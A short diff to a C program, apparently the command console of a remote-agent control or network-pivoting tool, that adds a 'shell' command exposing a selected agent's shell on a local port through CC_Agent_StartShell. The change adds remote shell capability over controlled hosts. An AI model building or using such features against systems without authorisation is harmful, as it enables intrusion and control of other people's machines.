@@ -39,6 +39,13 @@ int whileMain(){
             sscanf(line,"goto %d",&agentnow);
             Printf_OK("Current be contral ID is %d",agentnow);
         }
+        else if(startWith(line,"shell")){
+            int shellport;
+            sscanf(line,"shell %d",&shellport);
+            Printf_OK("band %d's shell on %d locol port.",agentnow,shellport);
+            
+            CC_Agent_StartShell(agentnow,shellport,200,10000);
+        }
         else if(startWith(line,"connect")){
             Printf_OK("target agent connect new agent");
 //            Printf_OK(line);
